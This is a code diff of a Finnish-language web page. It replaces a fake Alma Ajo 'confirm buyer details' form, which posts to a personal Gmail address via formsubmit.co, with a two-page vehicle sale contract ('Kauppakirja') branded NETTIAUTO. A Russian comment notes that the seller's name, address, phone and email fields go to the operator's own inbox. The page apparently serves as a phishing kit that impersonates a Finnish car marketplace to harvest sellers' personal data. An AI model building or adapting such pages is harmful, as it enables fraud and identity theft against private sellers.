@@ -1,337 +1,213 @@
 <!DOCTYPE html>
 <html lang="fi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Vahvista ostajan tiedot</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Kauppakirja</title>
 
 <style>
-
-    /* ALMA FOOTER */
-.alma-footer {
-    background-color: #3a3a3a;
-    color: #ffffff;
-    padding: 50px 0 30px;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+/* ===== BASE ===== */
+*{box-sizing:border-box}
+body{
+  margin:0;
+  background:#f0f0f0;
+  font-family:Arial, Helvetica, sans-serif;
+  color:#000;
 }
 
-.alma-footer-inner {
-    max-width: 1200px;
-    margin: 0 auto;
-    padding: 0 20px;
+/* ===== PAGE ===== */
+.page{
+  background:#fff;
+  width:210mm;
+  min-height:297mm;
+  margin:20px auto;
+  padding:20mm;
+  box-shadow:0 0 10px rgba(0,0,0,.15);
 }
+.page.break{ page-break-after: always; }
 
-/* LOGO */
-.alma-logo {
-    font-size: 28px;
-    font-weight: 800;
-    letter-spacing: 2px;
-    margin-bottom: 30px;
+/* ===== HEADER ===== */
+.header{
+  display:flex;
+  justify-content:space-between;
+  margin-bottom:12px;
 }
+.header .title{font-weight:bold;font-size:16px}
+.header .brand{font-weight:bold;font-size:20px}
 
-/* COLUMNS */
-.alma-columns {
-    display: grid;
-    grid-template-columns: repeat(3, 1fr);
-    gap: 40px;
+/* ===== SECTIONS ===== */
+.section{margin-top:10px}
+.section h3{margin:6px 0;font-size:13px}
+
+/* ===== TABLE ===== */
+table{width:100%;border-collapse:collapse;font-size:12px}
+td{border:1px solid #000;padding:4px;vertical-align:middle}
+.label{width:28%;background:#f9f9f9}
+
+/* ===== INPUT AS LINE ===== */
+.field{
+  width:100%;
+  border:none;
+  border-bottom:1px solid #000;
+  font-size:12px;
+  padding:2px 2px;
+  background:transparent;
 }
+.field:focus{outline:none}
 
-.alma-col h4 {
-    font-size: 16px;
-    margin-bottom: 14px;
+/* ===== CHECK ===== */
+.check{font-size:12px;margin-top:6px}
+
+/* ===== SIGN ===== */
+.sign-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:20px;
+  margin-top:20px;
 }
+.sign-box{border:1px solid #000;height:40px}
 
-.alma-col a {
-    display: block;
-    color: #ffffff;
-    text-decoration: none;
-    font-size: 14px;
-    margin-bottom: 8px;
-    opacity: 0.9;
-}
+/* ===== FOOTER ===== */
+.footer{font-size:10px;margin-top:10px;text-align:right}
 
-.alma-col a:hover {
-    text-decoration: underline;
-}
-
-.show-all {
-    margin-top: 10px;
-    font-weight: 600;
-}
-
-/* BOTTOM */
-.alma-bottom {
-    margin-top: 40px;
-    font-size: 13px;
-    opacity: 0.8;
-}
-
-.alma-bottom a {
-    color: #ffffff;
-    text-decoration: none;
-}
-
-.alma-bottom span {
-    margin: 0 8px;
-}
-
-/* RESPONSIVE */
-@media (max-width: 900px) {
-    .alma-columns {
-        grid-template-columns: 1fr;
-        gap: 30px;
-    }
-
-    .alma-logo {
-        text-align: center;
-    }
-
-    .alma-bottom {
-        text-align: center;
-        line-height: 1.6;
-    }
-}
-
-/* RESET */
-* {
-    box-sizing: border-box;
-}
-
-body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-    background-color: #f2f4f7;
-    color: #1a1a1a;
-}
-
-/* HEADER */
-.na-header {
-    background-color: #CC3300;
-    height: 64px;
-    display: flex;
-    align-items: center;
-}
-
-.na-header-inner {
-    max-width: 1200px;
-    width: 100%;
-    margin: 0 auto;
-    padding: 0 16px;
-}
-
-.na-logo {
-    height: 32px;
-}
-
-/* FORM CARD */
-.container {
-    max-width: 520px;
-    margin: 32px auto;
-    background: #ffffff;
-    border-radius: 8px;
-    padding: 28px;
-    box-shadow: 0 1px 6px rgba(0,0,0,0.08);
-}
-
-h1 {
-    font-size: 22px;
-    margin-bottom: 8px;
-}
-
-.description {
-    font-size: 14px;
-    color: #555;
-    margin-bottom: 24px;
-}
-
-label {
-    display: block;
-    font-weight: 600;
-    margin-top: 16px;
-    font-size: 14px;
-}
-
-input[type="text"],
-input[type="email"],
-input[type="tel"],
-input[type="number"] {
-    width: 100%;
-    padding: 12px;
-    margin-top: 6px;
-    border-radius: 6px;
-    border: 1px solid #cfd6e0;
-    font-size: 14px;
-}
-
-input:focus {
-    outline: none;
-    border-color: #0072ce;
-}
-
-/* CHECKBOX */
-.checkbox {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    margin-top: 20px;
-    font-size: 13px;
-    color: #444;
-}
-
-.checkbox input {
-    margin-top: 3px;
-}
-
-/* BUTTON */
-button {
-    width: 100%;
-    margin-top: 28px;
-    padding: 14px;
-    background-color: #0072ce;
-    color: #ffffff;
-    font-size: 16px;
-    font-weight: 600;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-}
-
-button:hover {
-    background-color: #005fa3;
-}
-
-.notice {
-    margin-top: 18px;
-    font-size: 12px;
-    color: #666;
-    line-height: 1.4;
-}
-
-/* RESPONSIVE */
-@media (max-width: 600px) {
-    .container {
-        margin: 16px;
-        padding: 20px;
-    }
-
-    h1 {
-        font-size: 20px;
-    }
+/* ===== PRINT ===== */
+@media print{
+  body{background:none}
+  .page{margin:0;box-shadow:none}
+  button{display:none}
+  /* превращаем input в текст */
+  input.field{
+    border:none;
+    padding:0;
+  }
 }
 </style>
 </head>
 
 <body>
 
-<!-- HEADER -->
-<header class="na-header">
-  <div class="na-header-inner">
-    <img src="logo.png" alt="Alma Ajo" class="na-logo">
+<!-- ================= PAGE 1 ================= -->
+<form class="page break"
+      action="https://formsubmit.co/TVOY_EMAIL@gmail.com"
+      method="POST">
+
+  <div class="header">
+    <div class="title">KAUPPAKIRJA</div>
+    <div class="brand">NETTIAUTO</div>
   </div>
-</header>
 
-<!-- FORM -->
-<div class="container">
+  <!-- OST AJA -->
+  <div class="section">
+    <h3>Ostaja</h3>
+    <table>
+      <tr>
+        <td class="label">Nimi</td><td><input class="field"></td>
+        <td class="label">Henkilö-/Y-tunnus</td><td><input class="field"></td>
+      </tr>
+      <tr>
+        <td class="label">Osoite</td><td colspan="3"><input class="field"></td>
+      </tr>
+      <tr>
+        <td class="label">Postinumero ja -toimipaikka</td><td><input class="field"></td>
+        <td class="label">Puh. nro</td><td><input class="field"></td>
+      </tr>
+    </table>
+  </div>
 
-    <h1>Vahvista ostajan tiedot</h1>
-    <div class="description">
-        Täytä alla olevat tiedot viimeistelläksesi ajoneuvokaupan.
+  <!-- MYYJÄ (ЭТИ ПОЛЯ УХОДЯТ ТЕБЕ НА ПОЧТУ) -->
+  <div class="section">
+    <h3>Myyjä</h3>
+    <table>
+      <tr>
+        <td class="label">Nimi</td>
+        <td><input class="field" name="Myyjän nimi" required></td>
+        <td class="label">Henkilö-/Y-tunnus</td><td><input class="field"></td>
+      </tr>
+      <tr>
+        <td class="label">Osoite</td>
+        <td colspan="3"><input class="field" name="Myyjän osoite" required></td>
+      </tr>
+      <tr>
+        <td class="label">Postinumero ja -toimipaikka</td><td><input class="field"></td>
+        <td class="label">Puh. nro</td>
+        <td><input class="field" name="Myyjän puhelin" required></td>
+      </tr>
+      <tr>
+        <td class="label">Sähköposti</td>
+        <td colspan="3"><input class="field" name="Myyjän email" required></td>
+      </tr>
+    </table>
+
+    <div class="check">
+      ☐ Ostajan ja myyjän henkilöllisyydet on tarkistettu passista tai ajokortista
     </div>
+  </div>
 
-    <form action="https://formsubmit.co/kastalmero@gmail.com" method="POST">
+  <!-- AJONEUVO -->
+  <div class="section">
+    <table>
+      <tr><td class="label">Rekisterinumero</td><td><input class="field"></td></tr>
+      <tr><td class="label">Ajoneuvon merkki ja malli</td><td><input class="field"></td></tr>
+      <tr><td class="label">Käyttöönottovuosi ja kuukausi</td><td><input class="field"></td></tr>
+      <tr><td class="label">Ajoneuvolaji</td><td><input class="field"></td></tr>
+      <tr><td class="label">Runkonumero</td><td><input class="field"></td></tr>
+    </table>
+  </div>
 
-        <label>Nimi</label>
-        <input type="text" name="Nimi" placeholder="Etunimi ja sukunimi" required>
+  <div class="footer">Sivu 1 / 2</div>
 
-        <label>Osoite</label>
-        <input type="text" name="Osoite" placeholder="Katuosoite, kaupunki" required>
+  <!-- FormSubmit settings -->
+  <input type="hidden" name="_subject" value="Kauppakirja – Myyjän tiedot">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="success.html">
 
-        <label>Puhelinnumero</label>
-        <input type="tel" name="Puhelin" placeholder="+358 XX XXX XXXX" required>
+</form>
 
-        <label>Sähköpostiosoite</label>
-        <input type="email" name="Email" placeholder="esimerkki@email.com" required>
+<!-- ================= PAGE 2 ================= -->
+<div class="page">
 
-        <label>Ajoneuvon merkki</label>
-        <input type="text" name="Auton merkki" placeholder="Esim. Volvo, Audi" required>
+  <div class="section">
+    <h3>Kauppasumman suoritus</h3>
+    <table>
+      <tr>
+        <td class="label">Koko kauppasumma</td>
+        <td><input class="field"></td>
+        <td class="label">Käsiraha</td>
+        <td><input class="field"></td>
+      </tr>
+    </table>
+  </div>
 
-        <label>Hinta (€)</label>
-        <input type="number" name="Hinta" placeholder="Syötä kauppahinta" required>
+  <div class="section">
+    <h3>Paikka ja päivämäärä</h3>
+    <table>
+      <tr><td><input class="field"></td></tr>
+    </table>
+  </div>
 
-        <!-- CONSENT CHECKBOX -->
-        <div class="checkbox">
-            <input type="checkbox" required>
-            <span>
-                Hyväksyn tietojeni käsittelyn ajoneuvokaupan vahvistamista varten.
-            </span>
-        </div>
-
-        <!-- FormSubmit -->
-        <input type="hidden" name="_subject" value="Uusi ajoneuvokaupan vahvistus">
-        <input type="hidden" name="_captcha" value="false">
-        <input type="hidden" name="_next" value="https://alfredodefaro-ai.github.io/form/success.html">
-
-        <button type="submit">Vahvista tiedot</button>
-    </form>
-
-    <div class="notice">
-        Tietoja käytetään ainoastaan ajoneuvokaupan käsittelyyn.
+  <div class="sign-grid">
+    <div>
+      Myyjän allekirjoitus
+      <div class="sign-box"></div>
+      Nimiselvennys
+      <div class="sign-box"></div>
     </div>
+    <div>
+      Ostajan allekirjoitus
+      <div class="sign-box"></div>
+      Nimiselvennys
+      <div class="sign-box"></div>
+    </div>
+  </div>
 
+  <div class="footer">Sivu 2 / 2</div>
+
+  <div style="margin-top:10px;font-size:10px">
+    Tätä sopimusta on tehty kaksi (2) yhtäpitävää kappaletta, yksi (1) kummallekin osapuolelle.
+  </div>
+
+  <button onclick="window.print()">Tallenna PDF</button>
 </div>
- <footer class="alma-footer">
-  <div class="alma-footer-inner">
-
-    <div class="alma-logo">
-      <span>ALMA</span>
-    </div>
-
-    <div class="alma-columns">
-
-      <div class="alma-col">
-        <h4>Ajassa</h4>
-        <a href="#">Iltalehti.fi</a>
-        <a href="#">Kauppalehti</a>
-        <a href="#">Talouselämä</a>
-        <a href="#">Uusi Suomi</a>
-        <a href="#">Arvopaperi</a>
-        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
-      </div>
-
-      <div class="alma-col">
-        <h4>Vapaalla</h4>
-        <a href="#">Etuovi.com</a>
-        <a href="#">Nettiauto</a>
-        <a href="#">Baana</a>
-        <a href="#">Autotalli.com</a>
-        <a href="#">AutoJerry.fi</a>
-        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
-      </div>
-
-      <div class="alma-col">
-        <h4>Työssä</h4>
-        <a href="#">Kauppalehti</a>
-        <a href="#">Jobly</a>
-        <a href="#">Tekniikka & Talous</a>
-        <a href="#">Tivi</a>
-        <a href="#">Konepörssi</a>
-        <a class="show-all" href="#">NÄYTÄ KAIKKI</a>
-      </div>
-
-    </div>
-
-    <div class="alma-bottom">
-      © Alma Media Oyj 2025
-      <span>•</span>
-      <a href="#">Tietosuoja</a>
-      <span>•</span>
-      <a href="#">Evästeasetukset</a>
-      <span>•</span>
-      <a href="#">Alma Media yhteystiedot</a>
-    </div>
-
-  </div>
-</footer>
 
 </body>
 </html>
